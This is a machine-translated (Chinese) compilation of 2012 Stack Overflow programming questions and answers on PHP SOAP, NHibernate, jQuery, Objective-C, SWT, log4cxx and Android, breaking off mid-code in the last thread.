多语言的 symfony2 网站的最佳 SEO 策略是什么？

我已经创建了我的路线`/{_locale}/route`，例如“ `website.com/en/test-page`”和“ `website.com/de/test-page`”。

这是一种安全且专业的方法吗，还是我应该从 url 中隐藏语言（这种方式可能`website.com/test-page`适用于两种语言）。或者甚至创建像 de.website.com 和 en.website.com 这样的 dns 别名？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-19T18:55:07.583

通常不赞成从同一个 URL 提供不同版本的内容，因此网络上的标准是向 URL 添加位置。

您所描述的 URL 模式是处理语言环境/国际化的几种标准方法之一，也是 Symfony2 实现的最佳方法。这是很常见的，不应该对您的 SEO 产生任何负面影响。

其他常用方法都可以，但它们都有自己的问题：

1.  使用 get 参数 (http://example.com?loc=en) 很常见，但 Google 不建议这样做，就像您不会对文章名称或 ID 使用 get 参数一样。

2.  DNS 别名是另一种常见的选择，但它们不能很好地与 Symfony 路由配合使用。

# php - 当 wsdl 消息具有相同的部分名称时，SoapServer 不正确地映射函数

> ID：13957539
> 
> 赞同：2
> 
> 时间：2012-12-19T17:10:07.650
> 
> 标签：php, soapserver

我不确定这是 php 错误（错误的实现）还是我的错误（对 SOAP 协议/SoapServer 的理解不佳，因为这是我第一次使用 SoapServer）

我注意到如果有两个或多个相同的操作`wsdl:part`（即使`wsdl:message`, operation 和 soapAction 不同）， The`SoapServer`总是会调用第一个函数。在这个例子中，我有两个函数`multiply2`，并且`multiply4`都有`num`(int) 作为输入参数。今天早些时候，如果我更改部件名称 (service1.wsdl)，则功能映射正确。

虽然，我不介意使用不同的名称，但在我看来它就像一个错误。我错过了什么还是应该打开一个错误？

这是我创建的简单示例：

非常简单的php类

```
<?php
class Multi
{
    function multiply2($num) { return ($num * 2 ); }
    function multiply4($num){ return ($num * 4 );  }
}
?> 
```

并且稍微改变了 SoapServer （增加了日志记录 -[改编自这篇文章](http://blog.mayflower.de/179-Extending-class-SoapServer-PHP5-for-debugging.html)）但是当我使用普通的 SoapServer 时也会出现问题：

```
$server = new overloadedSoapServer("service.wsdl", array('soap_version' => SOAP_1_2,'encoding' => SOAP_ENCODED));
$server->setClass("multi");

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $server->handle();
} 
```

这是客户端代码：

```
ini_set("soap.wsdl_cache_enabled", "0");
$client = new SoapClient('service.wsdl');
$client1 = new SoapClient('service1.wsdl');
echo "<pre>\nFrom service.wsdl:";
echo  "\n".$client->multiply2(10);
echo  "\n".$client->multiply4(10);
echo "</pre>";
echo "<pre>\nFrom service1.wsdl:";
echo  "\n".$client1->multiply2(10);
echo  "\n".$client1->multiply4(10);
echo "</pre>"; 
```

`service.wsdl`并且`service1.wsdl`基本上是相同的文件，但有两个例外：

1.  它们的端点不同（`service.wsdl`指向`http://tests.simsimy.info/web/service.php`和`service1.php`指向`http://tests.simsimy.info/web/service1.php`每个端点使用适当的 wsdl 来加载`SoapServer`）
2.  in`service.wsdl` `multiply2Request`和`multiply4Request`具有作为部件名称 - `num`，而 in`service1.wsdl`名称不同 ( `num2`and `num4`)

这是 service.wsdl 的完整 wsdl

```
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<wsdl:definitions xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"
    xmlns:tns="http://tests.simsimy.info/web/" xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/"
    xmlns:xsd="http://www.w3.org/2001/XMLSchema" name="service"
    targetNamespace="http://tests.simsimy.info/web/">
    <wsdl:message name="multiply2Request">
        <wsdl:part name="num" type="xsd:int"></wsdl:part>
    </wsdl:message>
    <wsdl:message name="multiply2Response">
        <wsdl:part name="res" type="xsd:int"></wsdl:part>
    </wsdl:message>

    <wsdl:message name="multiply4Request">
        <wsdl:part name="num" type="xsd:int"></wsdl:part>
    </wsdl:message>
    <wsdl:message name="multiply4Response">
        <wsdl:part name="res" type="xsd:int"></wsdl:part>
    </wsdl:message>
    <wsdl:portType name="dd">
        <wsdl:operation name="multiply2">
            <wsdl:input message="tns:multiply2Request"></wsdl:input>
            <wsdl:output message="tns:multiply2Response"></wsdl:output>
        </wsdl:operation>
        <wsdl:operation name="multiply4">
            <wsdl:input message="tns:multiply4Request"></wsdl:input>
            <wsdl:output message="tns:multiply4Response"></wsdl:output>
        </wsdl:operation>
    </wsdl:portType>
    <wsdl:binding name="serviceSOAP" type="tns:dd">
        <soap:binding style="document"
            transport="http://schemas.xmlsoap.org/soap/http" />
        <wsdl:operation name="multiply2">
            <soap:operation soapAction="http://tests.simsimy.info/web/multiply2" />
            <wsdl:input>
                <soap:body use="literal" />
            </wsdl:input>
            <wsdl:output>
                <soap:body use="literal" />
            </wsdl:output>
        </wsdl:operation>
        <wsdl:operation name="multiply4">
            <soap:operation soapAction="http://tests.simsimy.info/web/multiply4" />
            <wsdl:input>
                <soap:body use="literal" />
            </wsdl:input>
            <wsdl:output>
                <soap:body use="literal" />
            </wsdl:output>
        </wsdl:operation>
    </wsdl:binding>
    <wsdl:service name="multiply_service">
        <wsdl:port binding="tns:serviceSOAP" name="serviceSOAP">
            <soap:address location="http://tests.simsimy.info/web/service.php" />
        </wsdl:port>
    </wsdl:service>
</wsdl:definitions> 
```

中的更改部分`service1.wsdl`：

```
<wsdl:message name="multiply2Request">
        <wsdl:part name="num2" type="xsd:int"></wsdl:part>
    </wsdl:message>
    <wsdl:message name="multiply2Response">
        <wsdl:part name="res" type="xsd:int"></wsdl:part>
    </wsdl:message>

    <wsdl:message name="multiply4Request">
        <wsdl:part name="num4" type="xsd:int"></wsdl:part>
    </wsdl:message>
    <wsdl:message name="multiply4Response">
        <wsdl:part name="res" type="xsd:int"></wsdl:part>
    </wsdl:message> 
```

当我运行客户端代码时，我得到以下输出：

```
From service.wsdl:
20
20

From service1.wsdl:
20
40 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-19T18:21:15.563

您可以将 wsdl 中的绑定样式从“document”更改为“rpc”。

首先，我认为这是一个缓存问题，因为您在上面发布的服务器代码不包含用于禁用缓存的 ini_set()。但这不是缓存问题。

跟踪 http 流量。客户端似乎正常工作，这是一个 SoapServer 问题。（就像你提到的）.. 进一步调查......

已经[提交](https://bugs.php.net/bug.php?id=49169)了一个错误报告——尽管目前还不清楚它是否是一个错误。

错误报告中也提到了解决方法。如果这适合您，您可以将绑定样式更改为 rpc：

改变

```
<soap:binding style="document" 
```

至

```
<soap:binding style="rpc" 
```

这种解决方法对我有用。[您会在此处](http://www.ibm.com/developerworks/webservices/library/ws-whichwsdl/)找到一篇关于绑定样式如何工作的非常有趣的文章。这可以帮助您确定 rpc 绑定样式是否适合您。

# nhibernate - 使用 Fluent NHibernate 定义派生布尔属性

> ID：13957542
> 
> 赞同：4
> 
> 时间：2012-12-19T17:10:14.957
> 
> 标签：nhibernate, fluent-nhibernate, fluent-nhibernate-mapping

我有一堂课

```
public class Account {

   public DateTime? StartDate {get;set;}

   public DateTime? EndDate {get;set;}

   public bool IsActive {get;set;}

} 
```

IsActive 属性定义为公式

```
.Formula(" StartDate < GETDATE() and (EndDate is NULL or EndDate > GetDate())") 
```

但是，当使用 QueryOver 查询 IsActive == true 的所有帐户时，我收到 NHibernate 无法执行 SQL 的错误。

NHibernate 生成的 SQL 有

```
...other criterias...
and this_.StartDate < GETDATE()
   and (this_.EndDate is NULL 
         or this_.EndDate > GetDate()) = 1 
```

如何正确定义公式。

公式是超越这样做的正确方法，还是有完全不同的方法来解决它

**更新 ：**

*   有没有办法在不改变底层数据库的情况下做到这一点

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-20T07:01:49.800

在这种情况下，`Formula`应该/必须返回`bool`. 因此，我们可以通过这种方式重新定义公式*（SQL Server 语法）*：

```
.Formula(@"
(
  CASE
    WHEN  StartDate < GETDATE() and (EndDate is NULL or EndDate > GetDate())
     THEN 1
     ELSE 0
  END
)
"; 
```

*（**括号**不是必需的，但是...）*返回值为 1 或 0 表示布尔值。所以现在这`QueryOver`将起作用：

```
var query = session.QueryOver<Account>()
           .Where(a => a.IsActive == true);
var list = query.List<Account>(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-19T18:04:32.487

我认为这会起作用，但我没有使用 NHibernate 对其进行测试以确保正确解释条件。您必须通过此方法使用 LINQ 查询。您也可以使用扩展方法采取类似的方法。

```
public class Account
{
    public DateTime? StartDate { get; set; }
    public DateTime? EndDate { get; set; }
    public bool IsActive
    {
        get { return AccountIsActive(this); }
    }

    public static readonly Func<Account, bool> AccountIsActive = a =>
        {
            var now = DateTime.Now;
            return (a.StartDate.HasValue && a.StartDate < now) && (!a.EndDate.HasValue || a.EndDate > now);
        };
} 
```

用法：

```
var activeAccounts = session.Query<Account>()
                     .Where(a => Account.AccountIsActive(a))
                     .ToList(); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-19T17:28:48.013

将表本身的公式定义为[计算列](http://msdn.microsoft.com/en-us/library/ms191250%28v=sql.105%29.aspx)。这也具有在 NHibernate 之外工作的好处，而无需复制公式逻辑。您需要通知您的 NHibernate 映射，它不应该通过将“生成”设置为始终尝试写入计算列。

# javascript - 用于移动输入字段 maxlength 行为的 Chrome

> ID：13957547
> 
> 赞同：6
> 
> 时间：2012-12-19T17:10:27.990
> 
> 标签：javascript, html, forms, google-chrome, mobile

我注意到在输入字段上使用 maxLength 属性时，Chrome for mobile 将允许输入比 maxLength 更多的字符，然后在字段失去焦点时减少到最大长度量。

Chrome for mobile 是我见过的唯一表现出这种特殊行为的浏览器。

我们的 QA 团队已将此问题作为我们正在开发的移动应用程序上的一个错误提出，尽管我们可以使用 JavaScript 强制执行它，但由于各种原因，我们犹豫要不要走这条路。

有没有一种简单的方法可以改变这种行为，或者是破解它还是忍受它？

# c# - MVC 中的异常 - 3 视图无法对空引用执行运行时绑定

> ID：13957548
> 
> 赞同：7
> 
> 时间：2012-12-19T17:10:28.143
> 
> 标签：c#, asp.net-mvc-3

我正在研究 MVC-3。我认为我面临以下异常：

```
cannot perform runtime binding on a null reference 
```

**模型类**

```
 public class HomeModel
    {
        public IEnumerable<Html> Template { get; set; }
    } 
```

**查看代码**

```
@model Project.Models.HomeModel 

    @{
        ViewBag.Title = "Home Page";
        int i = 0;
    }
    <div class="container">
            @foreach (var e in Model.Template)    //getting exception on this foreach loop
            {
                 //loop content    
            }
    </div> 
```

**控制器**

```
public ActionResult Index()
{
    HomeModel model = new HomeModel();

    model.Template = db.Templates();

    return View(model);
} 
```

我的视图是 HomeModel 模型类的强类型。谁能帮我解决这个问题？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-12-19T23:19:12.573

这是由于延迟执行 LINQ。Model.Template 的结果在您尝试访问它们之前不会被计算，在这种情况下 db.Template 超出了视图的范围。您可以通过使用`ToList()`to`ToArray()`和`ToDictionary()`with来做到这一点`db.Templates`。

您的控制器代码应如下所示：

```
public ActionResult Index()
{
    HomeModel model = new HomeModel();

    model.Template = db.Templates.ToList();

    return View(model);
} 
```

# jquery - 滑块的活动类

> ID：13957556
> 
> 赞同：0
> 
> 时间：2012-12-19T17:10:50.237
> 
> 标签：jquery, css

伙计们，我只是坚持这一点，正在上课。它只是对我不起作用-我将显示代码，它可以让您更快地帮助我。我知道该理论背后的 Jquery 逻辑，但实际上它只是没有完成。这就是我过来问这个的原因。它在[http://jsfiddle.net/j08691/dZ9KP/12/](http://jsfiddle.net/j08691/dZ9KP/12/)上。

```
<div id="MainContainer">
  <ul id="MainNav">
    <li> <a href="#page1">   title 1  </a>     </li>
    <li>    <a  href="#page2">  title 2 </a>     </li>                
  </ul>
  <div id="MainContent">
    <div class="MainContentEach" id="page1">
      title 1 content
    </div>
    <div class="MainContentEach" id="page2">
      title 2 content
    </div>
  </div>
</div> 
```

JS

```
 $(function () {
        $('#MainNav a').click(function () {
        pageId = $(this).attr('href');
        num = $('#MainNav a').index(this);
        $(pageId).parent().animate({ scrollTop: (500 * num) }, 'slow');
        });
      }); 
```

任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-19T17:53:50.033

如果您只需要在点击标签时添加一个调用标签的类`active`，`<a>`您可以执行以下操作：

```
$(function () {
    $('#MainNav a').click(function () {
         pageId = $(this).attr('href');
         num = $('#MainNav a').index(this);
         $(pageId).parent().animate({ scrollTop: (500 * num) }, 'slow');

         $('#MainNav a').each(function () {
             if ($(this).hasClass('active')) {
                 $(this).removeClass('active');
             }
         });

         if (!$(this).hasClass('active')) {
             $(this).addClass('active');
         }
    });
}); 
```

这将添加一个名为`active`您的`<a>`标签的类，请记住该类需要在您的样式表中定义。

# objective-c - NSInteger 错误的隐式转换

> ID：13957558
> 
> 赞同：18
> 
> 时间：2012-12-19T17:10:55.373
> 
> 标签：objective-c, xcode4.5

使用 MagicalRecord，我试图获取具有特定**clientNumber**的记录，该 clientNumber是 NSInteger（定义为 int16 作为数据类型）。

这是我收到错误的代码行：

```
ClientInfo *clientSelected = [ClientInfo MR_findFirstByAttribute:@"aClientNumber" withValue: clientNumber inContext:localContext]; 
```

更新：这是 MR_findFirstByAtytribute 的定义：

```
MR_findFirstByAttribute:(NSString *) withValue:(id) 
```

这是我得到的错误：

```
Implicit conversion of NSInteger (aka int) is disallowed with ARC 
```

对于我的生活，我看不出有什么问题。ClientInfo 定义为

```
@interface ClientInfo : NSManagedObject 
```

* * *

## 回答 #1

> 赞同：32
> 
> 时间：2012-12-19T17:19:41.673

的参数类型`withValue`是一个`id`（指针）。`NSInteger`是标量值（不是对象），不能隐式转换为指针值。

这纯粹是一个猜测，但从`NSNumber`可能`NSInteger`工作中创建一个：

```
NSNumber *val = [NSNumber numberWithInteger:clientNumber];
ClientInfo *clientSelected = [ClientInfo MR_findFirstByAttribute:@"aClientNumber" withValue:val inContext:localContext]; 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-12-19T17:59:54.833

根据您对方法的定义，它是期望的，`id`并且您正在传递`NSInteger`它`int`

# javascript - 除非包含 document.write()，否则 Javascript 会动态创建隐藏的 div

> ID：13957559
> 
> 赞同：0
> 
> 时间：2012-12-19T17:10:56.703
> 
> 标签：javascript, html

我已经动态创建了一个包含日期和时间的通用标题。目前它的行为和看起来都很好，但是一旦我删除了 document.write('.') 它就会消失。看来我需要在那里写任何形式的东西才能让 dateDiv 出现，即“。” 只是用于填充空间的随机字符。

```
//write date/time to div
var dateDiv = document.createElement('div');
dateDiv.innerHTML = '<p>' + d_names[curr_day] + ', ' + m_names[curr_month] + ' ' + curr_date + ',     ' + curr_year + ' | ' + '<strong>' + curr_hour + ':' + curr_min + ' ' + a_p + '</strong>' + '</p>';
dateDiv.id = 'dateTime';

//dateDiv disappears without a document.write() before being appended to the body. need to fix
document.write('.');

document.body.appendChild(dateDiv); 
```

我还没有找到这个问题的答案，有人看到问题了吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-19T17:21:25.867

由于 loganfsmyth 暗示您的代码可能在文档未完全加载时被执行。尝试：

```
window.onload = function(){
    //write date/time to div
    var dateDiv = document.createElement('div');
    dateDiv.innerHTML = '<p>' + d_names[curr_day] + ', ' + m_names[curr_month] + ' ' + curr_date + ',     ' + curr_year + ' | ' + '<strong>' + curr_hour + ':' + curr_min + ' ' + a_p + '</strong>' + '</p>';
    dateDiv.id = 'dateTime';
    document.body.appendChild(dateDiv);
}; 
```

编辑：参见例如[http://javascript.about.com/library/blonload.htm](http://javascript.about.com/library/blonload.htm)

# jquery - 为什么一个 jquery 脚本不能影响另一个 jquery 脚本

> ID：13957561
> 
> 赞同：0
> 
> 时间：2012-12-19T17:10:58.520
> 
> 标签：jquery, css, jquery-ui

解释。我的网站上有 jquery UI 标签。现在我从以前的开发人员那里挪用了这个职位，他在单个页面上有 100 个标签，显然他没有意识到你只需要这样做一次。好吧，现在我需要更新这 100 个选项卡以包含图像而不是单词文本。

尝试 1 是用 css 来做。在上面放一个背景，文本缩进 -9999px 但文本根本没有移动。

尝试 2 是编写一个脚本来 appendTo 我们想要的按钮的新图像。在 jsfiddle 中工作，但不在网站上......这怎么可能，你不能使用 jquery 更改 jquery 创建的东西..http://jsfiddle.net/cornelas/hnYQf/1/"/

```
 var prevImage = "http://www.pflivedevelopment.com/custom/images/prev.png";
    var nextImage = "http://www.pflivedevelopment.com/custom/images/next.png";
    $(".demo .mover").contents().filter(function() {return this.nodeType === 3;
    }).remove();
     $('<img src=" ' + prevImage + '"/>').appendTo("a.prev-tab");
    $('<img src=" ' + nextImage + '"/>').appendTo("a.next-tab"); 
```

尝试 3-........ 手动更改它们..... 几天的工作.... 尤其是使用 CMS... 关于如何使用另一个 jquery 脚本有效更改一个 jqueryUI 代码的任何建议?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-19T17:30:18.020

听起来这可以而且应该使用 CSS 来完成，但您可能遗漏了重要的一点。为了`text-indent`正常运行，该元素不能设置为`inline`，`a`默认情况下是 。

这是一个工作小提琴，链接文本通过 CSS 替换为图像：http: [//jsfiddle.net/crMhU/](http://jsfiddle.net/crMhU/)

# swt - SWT - 调整我的 ProgressMonitorDialog

> ID：13957562
> 
> 赞同：0
> 
> 时间：2012-12-19T17:11:00.670
> 
> 标签：swt, progressmonitor

我有一个可用的 ProgressMonitorDialog，但我想确保我正确设置它。

首先是代码：

**创建对话框的方法**

```
 public void startProgressBar() {
  try {
     new ProgressMonitorDialog(getShell()).run(true, true,
        new ProgressBarThread());
  } 
  catch (InvocationTargetException e) {
     MessageDialog.openError(getShell(), "Error", e.getMessage());
  } 
  catch (InterruptedException e) {
     MessageDialog.openInformation(getShell(), "Cancelled", e.getMessage());
  }
} 
```

**类文件**

```
 class ProgressBarThread implements IRunnableWithProgress {
  private static final int TOTAL_TIME = 1000;

  public ProgressBarThread() {

  }

  public void run(IProgressMonitor monitor) throws InvocationTargetException,InterruptedException {
     monitor.beginTask("Creating PDF File(s): Please wait.....", IProgressMonitor.UNKNOWN);
     for (int total = 0; total < TOTAL_TIME ; total++) {
        Thread.sleep(total);
        monitor.worked(total);
        if (total == TOTAL_TIME / 2) monitor.subTask("Please be patient... Operation should finish soon.");
    }
    monitor.done();

  }
} 
```

**调用 ProgressBar 并运行 Pdf 文件创建操作的方法**

```
private void startSavePdfOperation() {
  Display.getDefault().asyncExec(new Runnable() {
     public void run() {
        startProgressBar();
     }
  });
  saveOp = new AplotSaveOperation(appReg.getString("aplot.message.SAVETOPDF"), "PDF", session);
  saveOp.addOperationListener(new MyOperationListener(this) {

     public void endOperationImpl() {
        java.io.File zipFile = null;
        try {               
           AplotSaveResultsParser.SaveResult saveResults = saveOp.getSaveResults();
           if (saveResults != null) {
           ETC.....   ETC...... 
```

问题：

1.  由于 ProgressMonitorDialog 是一个 GUI，它需要在 Display.getDefault().asyncExec 中执行吗？

2.  如果 ProgressMonitorDialog 在单独的线程中运行，它如何知道在操作完成时关闭？

3.  进度条和操作有什么关系吗？

4.  我假设 ProgressBarThread 类中的 for 循环基本上是保持监视器打开的计时器是正确的？

5.  有没有办法提高 ProgressMonitorDialog 的指标速度，你也可以去掉取消按钮吗？

这就是我认为目前正在发生的事情。

1.  我在启动 PDF 操作侦听器之前启动进度条 **请参见上面的 startSavePdfOperation()**

2.  进度条以未知方式运行，但使用 for 循环保持进度条对话框打开，而操作在后台线程上运行。
    **请参阅上面的 ProgressBarThread 类**

3.  PDF 操作完成后，侦听器操作类将关闭基本 GUI 对话框。

    ```
    public void endOperation() {
     try {
        endOperationImpl();
     }
     finally {
        Display.getDefault().asyncExec(new Runnable() {
           public void run() {
              w.getShell().setCursor(new Cursor(Display.getCurrent(), SWT.CURSOR_ARROW));
              w.recursiveSetEnabled(getShell(), true);
              w.getShell().setEnabled(!getShell().getEnabled());
              w.close();
           }
        });
     } 
    ```

    }

4.  我不确定 ProgressBarThread 监视器发生了什么？

这可能吗？

1.  当 PDF 操作开始时，ProgressMonitorDialog 打开并启动指示器。可以保持未知。

2.  PDF 操作完成后，监视器关闭，然后基本 Dialog

我只想打开进度条对话框，通知用户他们的请求正在后台工作。

如前所述，上面的代码有效，但我担心关闭基本 GUI 会破坏我的进度线程和监视器不是好的做法。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-20T11:07:43.623

首先，在你的`ProgressBarThread#run()`你应该使用`monitor.worked(1)`. 您无需设置总工作量，而是将其增加自上次调用以来已完成的工作量。

Q1。是的，它需要在显示线程 Q2 中执行。通常，需要完成的工作实际上是在传递给进度监视器对话框的可运行文件中执行的，以便您可以准确地报告所取得的进度量。因此，您的操作（如果是同步调用）应该从内部调用，`ProgressBarThread#run()`以便仅在一个文件处理完成时调用 monitor.worked(1) 。

Q3。你在运行什么样的操作，也许它已经支持显示进度条，你只需要调用正确的API。是[`IUndoableOperation`](http://help.eclipse.org/galileo/index.jsp?topic=/org.eclipse.platform.doc.isv/reference/api/org/eclipse/core/commands/operations/IUndoableOperation.html)吗？

Q4。正如我所说，这种方法是有问题的，因为您永远无法准确地报告进度并仅在操作完成时关闭对话框。但是，如果这是您唯一的选择，那么您可以将`monitor`引用保存在某处，以便其他线程可以访问它。一旦`monitor.done()`被调用，你`ProgressBarThread#run()`应该返回，对话框将关闭。

Q5。您可以通过将正确的参数传递给来删除取消按钮`ProgressMonitorDialog#run(..)`：

```
new ProgressMonitorDialog(getShell()).run(true, false, new ProgressBarThread()); 
```

对于其余的问题，如果我知道您使用的是哪种操作（什么 API），我可以更好地回答。

# string - preg_match : 连字符之间的数字

> ID：13957563
> 
> 赞同：0
> 
> 时间：2012-12-19T17:10:59.697
> 
> 标签：string, preg-match, hyphen

我需要像这样验证和字符串：

```
$string = 'test3-10-2'; 
```

我需要连字符之间的倒数第二个数字，所以在这种情况下是“10”。这些是其他示例：

```
$string2 = 'test45-50-178-1';  //match = 178
$string3 = 'test45-580-89-12-1';  //match = 12 
```

你能帮助我吗 ？提前谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-19T17:18:51.077

这个 RegExp 应该使用积极的前瞻来解决问题：（将 4 更改为您想要允许的最大位数）

```
\d{1,4}(?=-\d{1,4}$) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-19T17:28:20.327

您还可以使用该`explode`函数（类似于 a `split`）：

```
$items = explode("-",$yourString);
end($items);
$whatYouWant = prev($items); 
```

# javascript - 单击时突出显示列表中的锚标记

> ID：13957564
> 
> 赞同：-2
> 
> 时间：2012-12-19T17:11:01.357
> 
> 标签：javascript, jquery, html

我有一个类似这样填充的侧边栏，每个链接在页面上的另一个 div 中加载不同的 html；

```
<div id = "sidebar-links">

      <% @locations.each do |locs| %>

        <p style = "border-bottom: 1px black solid">
          <a href = "#" class = "sidebar-click" onclick = 'renderLocation(+' <% locs %> +')'><%= locs['Address'] %></a>
        </p>

      <% end %>

</div> 
```

我想在单击每个链接时突出​​显示它。单击另一个链接后，我希望将其突出显示。目前这就是我正在做的；

```
$(document).ready(function() { // Start up jQuery
        $('a.sidebar-click').click(function() {
          $('a.sidebar-click').removeClass('ui-state-highlight');
          $(this).addClass('ui-state-highlight');
          return false;
    }); 
    });​ 
```

和风格;

```
.ui-state-highlight {border: 4px solid #ffffa1; margin-right: 3px;} 
```

但是这段代码不起作用！我该怎么做，或者在我目前的方法中我做错了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-10T00:29:57.610

$(document).ready 末尾的隐藏字符。我的错。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-12-19T17:13:53.253

尝试这个：

```
$(document).ready(function() {
    $('a.sidebar-click').click(function(e) {
      var this = $(this);
      $('#sidebar-links a').each(function() {
        $(this).removeClass('ui-state-highlight');
      });
      this.toggleClass('ui-state-highlight');
      e.preventDefault();
    }); 
}); 
```

* * *

## 回答 #3

> 赞同：-3
> 
> 时间：2012-12-19T17:15:58.417

我猜你不希望链接被跟踪，所以你的代码几乎没问题，但你需要防止默认事件，如下所示：

```
$(document).ready(function() { // Start up jQuery

    $('a.sidebar-click').click(function(e) {
        e.preventDefault(); // prevent following link's href
        $('a.sidebar-click').removeClass('ui-state-highlight');
        $(this).addClass('ui-state-highlight');
    });

});​ 
```

# c++ - 在 log4cxx 中使用 utf-8 字符

> ID：13957568
> 
> 赞同：8
> 
> 时间：2012-12-19T17:11:25.100
> 
> 标签：c++, logging, log4cxx

我需要能够将 utf-8 编码的字符串与 log4cxx 一起使用。我可以很好地打印字符串`std::cout`（字符显示正确）。使用 log4cxx，即将字符串放入`LOG4CXX_DEBUG()`宏中，`ConsoleAppender`将输出“??” 而不是特殊字符。我找到了一种解决方案：

```
LOG4CXX_DECODE_CHAR(logstring, str);
LOG4CXX_DEBUG(logstring); 
```

我的输入字符串在哪里`str`，但这不起作用。任何人都知道这可能如何工作？我用谷歌搜索了一下，但我找不到任何有用的东西。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-19T17:20:53.417

您可以使用

```
setlocale(LC_CTYPE, "UTF-8"); 
```

仅设置字符编码，而不更改有关区域设置的任何其他信息。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2017-07-29T12:42:56.357

I met the same problem and searched and searched. I found this post, It may work, but I don't like the `setlocaleish` solution. so i made more research, finally the solution came out.

I reconfigure `log4cxx` and build it, the problem was solved!

add two more configure options in `log4cxx`:

```
./configure --prefx=blabla --with-apr=blabla --with-apr-util=blabla --with-charset=utf-8 --with-logchar=utf-8 
```

hope this will help anyone who need it.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-02-27T16:08:19.803

第一个答案对我不起作用，第二个答案比我想要的要多。所以我结合了两个答案：

```
setlocale(LC_CTYPE, "xx_XX.UTF-8");  // or "xx_XX.utf8", it means the same 
```

其中 xx_XX 是一些语言标签。我尝试用不同的字母记录多种语言的字符串（在 LINUX 上，包括中文，语言从左到右和从右到左）；所以我尝试了：

```
setlocale(LC_CTYPE, "it_IT.UTF-8"); 
```

它适用于任何经过测试的语言。我不明白为什么没有指示语言 xx_XX 的简单“UTF-8”不起作用，因为我使用 UTF8 是独立于语言的，一个不应该指示一个。（如果有人也知道原因，那将是对答案的一个有趣的改进）。也许这也取决于操作系统。

最后，在 Linux 上，您可以通过在 shell 上键入来获取编码列表：

```
# locale -a | grep utf 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-12-19T17:16:13.003

一种解决方案是使用

```
setlocale(LC_ALL, "en_US.UTF-8"); 
```

在我的主要功能中。这对我来说没问题，但是如果您想要更多可本地化的应用程序，这可能会变得难以跟踪/使用。

# android - SeekBar 和 CountDownTimer

> ID：13957569
> 
> 赞同：0
> 
> 时间：2012-12-19T17:11:28.443
> 
> 标签：android, reset, seekbar, countdowntimer

我正在尝试使用 SeekBar 来控制 CountDownTimer 的速度，并且我在 2 个问题中停止了。1 - 当我更改搜索栏进度时，DownTimerInterval 不会重置......但每次我更改时都会添加进度值。2 - 当搜索栏进度设置为 0 时，我想停止倒计时......但它不起作用。如何解决？

这是我的代码

```
rolagem.setOnClickListener(new OnClickListener() {

    public void onClick(View v) {

        rolagemAutomatica();
    }
});

private void rolagemAutomatica() {
    barra = (SeekBar)findViewById(R.exibir_musica.barraFonte);
    barra.setVisibility(1);
    barra.setMax(4);
    barra.setProgress(0);
    barra.setOnSeekBarChangeListener( new SeekBar.OnSeekBarChangeListener() {

        public void onStopTrackingTouch(SeekBar seekBar) {
        }

        public void onStartTrackingTouch(SeekBar seekBar) {

        }

        public void onProgressChanged(SeekBar seekBar, int progress, boolean fromUser) {
            String[] VR = {"0","10","50","75","100"};
            //Define crono +1 cause position 0 crash the app
            int crono = Integer.parseInt(VR[progress]+1);

            CountDownTimer test = new CountDownTimer(400000 , crono) {

                @Override
                    public void onTick(long millisUntilFinished) {
                        scroll_letra.smoothScrollBy(0,
                                (int) (millisUntilFinished / 300000));

                    }

                    @Override
                    public void onFinish() {
                        // TODO Auto-generated method stub
                    }
                };
                if(crono-1 != 0){
                    test.start();
                }else{
                    test.cancel();
                }
            }
    });

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-19T17:25:29.320

将 CountDownTimer 保留为实例字段，以便您可以在需要时取消它。如果以 0 的滴答计时器启动一个会让你崩溃，那么当速度为 0 时不要启动一个。

像这样的东西：

```
barra.setOnSeekBarChangeListener( new SeekBar.OnSeekBarChangeListener() {

    public void onStopTrackingTouch(SeekBar seekBar) {
    }

    public void onStartTrackingTouch(SeekBar seekBar) {

    }

    public void onProgressChanged(SeekBar seekBar, int progress, boolean fromUser) {
        String[] VR = {"0","10","50","75","100"};
        int crono = Integer.parseInt(VR[progress]);

        if (fromUser) {
            this.countDownTimer.cancel();
            if (crono > 0) {
                 this.countDownTimer = new CountDownTimer(400000 , crono) {

                     @Override
                     public void onTick(long millisUntilFinished) {
                         scroll_letra.smoothScrollBy(0,
                                 (int) (millisUntilFinished / 300000));

                     }

                     @Override
                     public void onFinish() {
                         // TODO Auto-generated method stub
                         }
                     };
                     if(crono-1 != 0){
                         test.start();
                     }else{
                         test.cancel();
                     }
                }
            }
        }
}); 
```

您还可以进行更多优化。例如，您可以将 VR 定义为一个整数数组，这样您就不必解析它们，并且您可以将它们保留在实例上，这样您就不必一遍又一遍地创建数组，等等：

```
 int[] VR = new int[] {0, 10, 50, 75, 100}; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-21T18:47:38.597

我找到了这个问题的解决方案。

我将 countDownTimer 声明为全局变量。

```
CountDownTimer ctimer = null; 
```

之后......我创建了一个方法

```
private void timerRol(int contador) {
    if (contador == 0){
        Log.v(String.valueOf(contador), "Stopped");
    }else{  
        ctimer = new CountDownTimer(400000, contador) {

        @Override
        public void onTick(long millisUntilFinished) {

